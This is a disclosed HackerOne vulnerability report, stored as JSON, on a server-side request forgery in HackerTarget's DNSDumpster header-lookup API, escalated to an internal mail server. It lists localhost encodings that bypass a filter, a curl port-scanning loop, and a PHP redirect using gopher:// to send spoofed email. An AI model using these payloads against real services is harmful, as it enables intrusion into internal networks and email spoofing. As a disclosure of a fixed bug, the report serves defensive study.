{"id":392859,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTI4NTk=","url":"https://hackerone.com/reports/392859","title":"Sending Emails from  DNSDumpster - Server-Side Request Forgery to Internal SMTP Access","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-11-17T19:18:17.000Z","submitted_at":"2017-11-17T19:18:17.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cdl","url":"/cdl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31821,"url":"https://hackerone.com/hackertarget","handle":"hackertarget","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/821/616f439956256fb9d7ead5105664278e5cc39706_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/821/616f439956256fb9d7ead5105664278e5cc39706_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"profile":{"name":"Hacker Target","twitter_handle":"","website":"https://hackertarget.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-10T21:40:02.757Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\n| Summary: |\n| -- |\n[HackerTarget](https://hackertarget.com/) is a service that provides access to online vulnerability scanners and tools used by many security professionals and “makes securing your systems easier”. They also are the creators of [DNSDumpster](https://dnsdumpster.com/) which is a popular service used for recon.\n\n| Description: |\n| --|\n\u003e Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes. Getting a server to issue a request **is not** a vulnerability in itself, but it \n becomes one when you can make requests to things you wouldn’t or shouldn’t normally have access to, such as internal networks or internal services.\n\nIn [DNSDumpster](https://dnsdumpster.com/), there is a function to \"Get HTTP Headers\" for a specific host.  \n\n{F331105}\n\nThis function makes a call to the API at `https://api.hackertarget.com/httpheaders/?q=\u003ctarget\u003e` and it displays the HTTP Headers of a simple **HEAD** request sent from HackerTarget to the target server.\n\nThe `?q=` parameter was vulnerable to SSRF due to the absence of proper checks and firewalls.\n\n| Proof-of-Concepts |\n| -- | \n\n# Initial Proof-of-Concept:\nMy initial proof-of-concept was extremely bland and I didn't put very much effort into it:\n\n- `https://api.hackertarget.com/httpheaders/?q=http://127.0.0.1:22`\n\n{F331111}\n\n\nThey thanked me and attempted to patch. However, the patch was merely a regular expression that was checking for the string \"127.0.0.1\" and \"localhost\", which was easily bypassed using different encodings that would still resolve to localhost.\n\nExamples :\n\n```\n0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\nlocaltest.me\n```\n\nThere isn’t a solid way to validate hostnames just by using *string-based* checks, so my suggested mitigation was to resolve all hosts provided in the `?q=` parameter  and check them against local IP ranges.\n\n\nAbout a week and a half later:\n\n \u003e  “It is on my todo list. Not critical though as there are no local services that could be hit with it.”\n\n\n# Proof of Concept: Hitting Local Services.\nI attempted to enumerate different ports that internal services could be running on, even though there were none \"that could be hit with it.\"\n\n```\n#!/usr/bin/env bash\nfor port in `seq 1 9999`\ndo\n\techo -e \"\\n\\n[+] Checking Port: \"$port\"\\n\"\n\tcurl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port \u0026\u0026 echo -e \"\\n\"\ndone\n```\n\n```\n➜ cdl@skid   ~ chmod +x ht.sh \u0026\u0026 ./ht.sh 0177.1\n```\n\nThis spat out the following response: \n\n{F331112}\n\nThere was an internal SMTP server running on the standard port.\n\n**SMTP:**\n-   SMTP stands for Simple Mail Transfer Protocol.\n-  It is a TCP/IP protocol that’s used for **sending emails**.\n\nIn order to be able to send emails with SMTP we have to first have to know how mail transactions work:\n\n1. SMTP sessions are initiated after the **client** opens a TCP/IP connection to the server and the **server** responds with a greeting (220)\n2. The **client** sends a `HELO` or `EHLO` with the clients identity (example: `HELO hackertarget.com` which means \"Hi I'm hackertarget.com\")\n3. Now the client has to perform 3 steps each separated by a **CRLF** for a valid SMTP mail transaction:\n    - Step 1: `MAIL`: This tells the server \"Hey, we're starting a new email, reset your state\". This is where the email \"from\" is specified.\n    - Step 2: `RCPT`: Tells the server where (who) we want to send the email too.\n    - Step 3: `DATA`: This is where the Subject and body of the email are set, and the client indicates the end of the mail data by a new line containing only \".\". This tells the server that the client confirms the email and tells the server to process it and send it.\n\n   \nHere's a visualization of the structure of SMTP from [RFC 5321](https://tools.ietf.org/html/rfc5321):\n\n```\n                  +----------+                +----------+\n      +------+    |          |                |          |\n      | User |\u003c--\u003e|          |      SMTP      |          |\n      +------+    |  Client- |Commands/Replies| Server-  |\n      +------+    |   SMTP   |\u003c--------------\u003e|    SMTP  |    +------+\n      | File |\u003c--\u003e|          |    and Mail    |          |\u003c--\u003e| File |\n      |System|    |          |                |          |    |System|\n      +------+    +----------+                +----------+    +------+\n                            Email client                     SMTP server\n```\n\nThe SMTP Client was the \"Get HTTP Headers\" function of the API and the the SMTP Server was the service running on an internal port.\n\n\n# Leveraging the SSRF to send emails:\nThe API function was using libcurl to execute the requests *and* it was following redirects. The libcurl library supports an overabundance of protocols including `gopher://` which essentially sends 1 character, a new line (CR+LF), and the remaining data, which allows people to send a multiline requests. This means we can use gopher to send valid commands to the SMTP server and send emails.\n\n\n\n- http://\u003cserver\u003e/mail.php:\n\n```\n\u003c?php\n        $commands = array(\n                'HELO hackertarget.com',\n                'MAIL FROM: \u003cadmin@hackertarget.com\u003e',\n                'RCPT To: \u003ccdl@oou.us\u003e',\n                'DATA',\n                'Subject: corben!',\n                'Corben (cdl) was here, woot woot!',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://0:25/_'.$payload);\n?\u003e\n```\n\nThis responds with a 302 redirect to the internal SMTP server with the valid commands to send an email.\n\n\nI confirmed it worked by visiting the following URL:\n- https://api.hackertarget.com/httpheaders/?q=http://\u003cserver\u003e/mail.php \n\nI checked my email (cdl@oou.us) and I had an email from `admin@hackertarget.com` with the subject \"corben!\" and the body \"Corben (cdl) was here, woot woot!\"\n\nHere's the proof-of-concept video:\n- https://www.youtube.com/watch?v=F_sC_OrSkIc\n\n\n| Impact | \n|--| \nAn attacker could access internal networks and internal services. I could have sent valid emails from and as HackerTarget.\n\n\n\nThanks,\nCorben Leo (@cdl)\n- https://hacking.us.com\n- https://twitter.com/hacker_","original_report_id":null,"original_report_url":null,"attachments":[{"id":331105,"file_name":"ht-httpheaders.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?response-content-disposition=attachment%3B%20filename%3D%22ht-httpheaders.png%22%3B%20filename%2A%3DUTF-8%27%27ht-httpheaders.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145515Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1f21e50c8b040e3224202acaa26578d6158de9638756328cd2852c226957a0be","file_size":13649,"type":"image/png"},{"id":331111,"file_name":"ht-ssh.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?response-content-disposition=attachment%3B%20filename%3D%22ht-ssh.png%22%3B%20filename%2A%3DUTF-8%27%27ht-ssh.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145515Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c0c0209814a5a38e3e16db96eebad9b0918f19addfdaa9a59b9bf44423a3d5b4","file_size":38020,"type":"image/png"},{"id":331112,"file_name":"ht-postfix.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?response-content-disposition=attachment%3B%20filename%3D%22ht-postfix.png%22%3B%20filename%2A%3DUTF-8%27%27ht-postfix.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145515Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9169b924e82d8be2991ae213af48e8e1ef6b08dc8b9b738c72e96fad918fd6a8","file_size":40915,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":68,"voters":["barbie_girl","dyuen","pudsec","pomme","cdl","kapytein","jobert","michiel","sameerphad72","spam404","and 58 more..."],"severity":{"rating":"high","score":8.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3173999,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2017-12-06T19:18:17.000Z","updated_at":"2017-12-06T19:18:17.000Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"cdl","url":"/cdl"},"genius_execution_id":null,"team_handle":"hackertarget","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3174000,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-08-10T21:40:02.803Z","updated_at":"2018-08-10T21:40:02.803Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hackertarget","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3174085,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-08-10T22:08:16.604Z","updated_at":"2018-08-10T22:08:16.604Z","additional_data":{"old_severity":null,"new_severity":"High (8.6)","old_severity_id":null,"new_severity_id":194335},"actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"hackertarget","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":9756,"category":"researcher","content":"This is a write-up of an SSRF I accidentally found in DNS Dumpster / HackerTarget and leveraged to access to internal services. They **do not**  have a bug bounty program, **do not** test them without their permission. Originally blogged about this here: https://hacking.us.com/blog/hackertarget ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":114524,"username":"cdl","name":"Corben Leo","bio":"","cleared":true,"website":"https://hacking.us.com","location":"Minneapolis, Minnesota","created_at":"2016-09-29T14:44:35.410Z","url":"https://hackerone.com/cdl","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"hacker_resume_enabled":true,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}